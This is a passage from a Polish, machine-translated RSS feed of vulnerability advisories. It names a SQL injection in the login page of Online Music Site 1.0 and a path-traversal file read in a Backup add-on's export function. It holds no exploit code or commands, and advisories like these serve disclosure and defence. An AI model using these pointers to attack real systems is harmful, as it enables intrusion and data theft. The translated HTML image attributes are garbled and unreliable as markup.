eksploatacji.</description></item><item><title>CVE-2026-0605</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0605</link><pubDate>Mon, 05 Jan 2026 20:32:08 +0000</pubDate><description>W projektach kodu Online Music Site 1.0 wykryto lukę w zabezpieczeniach.Podatnością dotknięta jest nieznana funkcja w pliku /login.php.Taka manipulacja argumentem nazwa użytkownika/hasło prowadzi do wstrzyknięcia sql.Atak może zostać przeprowadzony zdalnie.Exploit został ujawniony publicznie i może zostać wykorzystany.
+
+CVSS Score: 7.3 (high)</description></item><item><title>CVE-2026-21857</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21857</link><pubDate>Mon, 05 Jan 2026 20:02:58 +0000</pubDate><description>### Podsumowanie
 Uwierzytelnieni użytkownicy z uprawnieniami do tworzenia kopii zapasowych mogą czytać dowolne pliki w katalogu internetowym poprzez przechodzenie ścieżek w funkcji eksportu plików dodatku Backup.
 &lt;img szerokość="664" wysokość="899" alt="image" src="https://github.com/user-attachments/assets/fd1ca69e-b275-4daf-9a62-621cde6525f5" /&gt;
 &lt;img szerokość="2358" wysokość="445" alt="image" src="https://github.com/user-attachments/assets/fad81152-9e1b-413e-9823-09540a23e2fb" /&gt;
